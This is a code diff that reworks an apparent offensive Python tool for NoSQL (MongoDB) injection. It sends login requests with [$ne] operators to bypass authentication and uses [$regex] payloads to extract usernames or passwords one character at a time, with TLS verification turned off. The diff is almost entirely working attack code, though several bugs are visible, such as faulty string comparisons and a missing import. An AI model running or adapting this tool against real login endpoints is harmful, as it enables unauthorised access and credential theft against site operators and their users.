@@ -6,6 +6,8 @@ import click
 from sys import stdout, stderr, argv
 from requests import post, get, put
 from urllib3.exceptions import InsecureRequestWarning
+from urllib3 import disable_warnings
+disable_warnings()
 
 class bc:
     PURPHEAD = '\033[35m'
@@ -19,21 +21,70 @@ class bc:
     UNDERLINE = '\033[4m'
     DEFAULT = '\033[0m'
 
-def test_injection(h, r, up, pp, ij, ot):
-    print(h,r,up,pp,ij,ot)
-    payld = {up + '[$ne]' : 'a', pp + '[$ne]' : '1' + ',' + ot}
-    if r is 'post' or 'POST':
-        query = post(h, data=payld, allow_redirects=False, verify=False)
-        if query.status_code == 302:
-            stdout.write(bc.OKGREEN + f'[+] {h} is injectable with "{up}" and "{pp}" parameters'+'\n'+bc.DEFAULT)
-            return True
-        else:
-            stdout.write(bc.FAIL + f'[-] {h} is not injectable through "{up}" and "{pp}" parameters'+'\n'+bc.DEFAULT)
-            return False
+class CodeInjector:
 
-# para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$ne]' : '1' + otherpara}
-def build_payload(h, up, pp, ij, ot):
-    pass
+    def __init__(self, h, r, up, pp, tg, ot):
+        self.h = h
+        self.r = r
+        self.up = up
+        self.pp = pp
+        self.tg = tg
+        self.ot = ot
+
+    def test_injection(self):
+        stdout.write('')
+        if self.r is 'post' or 'POST':
+            if self.inject(test=True):
+                stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable with "{self.up}" and "{self.pp}" parameters'+'\n'+bc.DEFAULT)
+                return True
+            else:
+                stdout.write(bc.FAIL + f'[-] Host {self.h} is not injectable'+'\n'+bc.DEFAULT)
+                return False
+
+    def build_payload(self, test=False, char=''):
+
+        injection_payloads = {f'{self.up}'  : {self.up + '[$regex]' : "^" + char + ".*", self.pp + '[$ne]' : '' + ',' + self.ot},
+                              f'{self.pp}'  : {self.up + '[$ne]' : '', self.pp + '[$regex]' : "^" + char + ".*"',' + ',' + self.ot},
+                              'test_pay' : {self.up + '[$ne]' : '', self.pp + '[$ne]' : '' + ',' + self.ot}}
+        if test:
+            return injection_payloads['test_pay']
+        if not test:
+            return injection_payloads[self.tg]
+
+    def inject(self, test=False):
+        badchar = r'&$^*\?+.|'
+        payload = self.build_payload(test=True)
+        if test:
+            if self.r is 'POST':
+                test_query = post(self.h, data=payload, allow_redirects=False, verify=False)
+                if test_query.status_code == 302:
+                    return True
+        else:
+            matches = []
+            if self.r is 'POST':
+                for c in string.printable:
+                    if c in badchar:
+                        continue
+                    payload = self.build_payload(char=c)
+                    query = post(self.h, data=payload, allow_redirects=False, verify=False)
+                    if query.status_code == 302:
+                        stdout.write(bc.OKBLUE + f'[+] Found matching character "{c}"\n'
+                                  + bc.DEFAULT + '[*] Enumerating rest of string...\n')
+                        matches.append(c)
+                        while True:
+                            for cc in string.printable:
+                                if cc in badchar:
+                                    continue
+                                print(''.join(matches) + cc)
+                                payload = self.build_payload(char=(''.join(matches) + cc))
+                                query = post(self.h, data=payload, allow_redirects=False, verify=False)
+                                if query.status_code == 302:
+                                    stdout.write(bc.OKBLUE + f'[+] Found matching starting character "{cc}"\n')
+                                    matches.append(cc)
+                                    break
+                            if query.status_code != 302:
+                                return ''.join(matches)
+
 
 def show_banner():
     stdout.write(r'''
@@ -47,25 +98,28 @@ Injection tool for NoSQL database engines like MongoDB'''+'\n\n')
 
 show_banner()
 @click.command()
-@click.option('-r','--request',type=click.Choice(['POST','GET']),default='POST',
+@click.option('-self.r','--request',type=click.Choice(['POST','GET']),default='POST',
                     help='Choose request type',show_default=True)
 @click.option('-U','userp',default='username',
                     help='Name of the username parameter',show_default=True,metavar='<str>')
 @click.option('-P','passwdp',default='password',
                     help='Name of the password parameter',show_default=True,metavar='<str>')
 @click.option('-p','--other-params','otherparam',default=[],
-                    help='List of other parameters contained in the URL. Ex: login:login',metavar='<key:val>')
-@click.option('-i','--inject-points','injects',default=['username','password'],show_default=True,
-                    help='Specify list of parameters for test for injections',metavar='<v1,v2,v3>')
+                    help='List of other parameters contained in the URL separated by commas',metavar='<key:val>')
+@click.option('-t','--target',show_default=True,
+                    help='Specify parameter to enumerate',metavar='<str>')
 @click.argument('host')
 def main(
     request='',
     userp='',
     passwdp='',
     otherparam=[],
-    injects=[],
+    target='',
     host=''):
-    if test_injection(host, request, userp, passwdp, injects, otherparam):
-        print("true")
+    injector = CodeInjector(host, request, userp, passwdp, target, otherparam)
+    stdout.write(f"[*] Target: {host}\n[*] Request type: {request}\n[*] Params: {userp} {passwdp} {otherparam}\n[*] Injection point: {target}\n")
+    if injector.test_injection():
+        injector.inject()
 
-main()
+if __name__ == '__main__':
+    main()
